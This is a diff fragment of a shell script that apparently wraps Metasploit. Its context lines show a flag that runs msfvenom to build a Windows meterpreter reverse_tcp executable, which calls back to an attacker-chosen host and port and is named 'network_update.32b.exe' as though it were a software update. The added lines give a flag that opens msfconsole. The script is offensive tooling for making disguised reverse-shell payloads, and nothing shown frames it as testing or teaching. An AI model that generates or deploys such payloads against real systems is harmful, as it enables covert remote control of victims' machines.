@@ -47,6 +47,10 @@ elif [ "$1" == "-gp" ]; then
 		msfvenom -p windows/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f exe -o payloads/network_update.32b.exe
 		echo -e "${GREEN}[+] Payload generated!"
 	fi
+elif [ "$1" == "-lc" ]; then
+	echo -e "[*] Launching console...${RESET}"
+	msfconsole
+	echo -e "${YELLOW}[*] Console killed."
 else
 	echo -e "${RED}Error. Invalid flag. Try -h to view help." >&2
 	exit 1
